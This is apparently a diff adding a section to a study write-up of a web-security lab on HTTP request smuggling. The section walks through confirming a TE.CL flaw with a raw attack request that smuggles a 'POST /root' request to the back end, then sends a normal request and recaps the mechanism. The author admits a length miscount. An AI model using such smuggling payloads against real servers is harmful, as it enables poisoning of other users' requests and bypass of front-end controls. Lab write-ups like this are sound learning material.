@@ -239,3 +239,48 @@ and the normal request :
     foo=bar
 
 Recap : the front uses CL, so we send all the request, the back uses TE so we tell him to end the request at `0\r\n\r\n` so the next `GET` will be on hold to prefix the next request. 
+
+# Confirming TE.CL vulnerabilities using differential responses
+
+Thanks to `Jarno Timmermans` the image is self explanatory: 
+
+![image](./img/TE.CL.DIFF.png)
+The payload i used to solve the lab
+
+Attack request : 
+
+
+    POST / HTTP/1.1
+    Host: 0ab4001c04adf96c83d6aa6b00eb0069.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 4
+    Transfer-Encoding: chunked
+
+    9b
+    POST /root HTTP/1.1
+    Host: 0ab4001c04adf96c83d6aa6b00eb0069.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 13
+    \r\n
+    0\r\n
+    \r\n
+
+Normal request : 
+
+    POST / HTTP/1.1
+    Host: 0ab4001c04adf96c83d6aa6b00eb0069.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 11
+
+    foo=bar
+
+Recap : So the front end since it's using TE, it will send all the payload, and the back end will be poisoned with 
+
+    POST /root HTTP/1.1
+    Host: 0ab4001c04adf96c83d6aa6b00eb0069.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 13
+    \r\n
+    0\r\n
+    \r\n
+and the content length is set to 13 it's 7 the size of `\r\n0\r\n\r\n` + `GET \` normally i mad a mistake it should be 14 since i used POST =) 
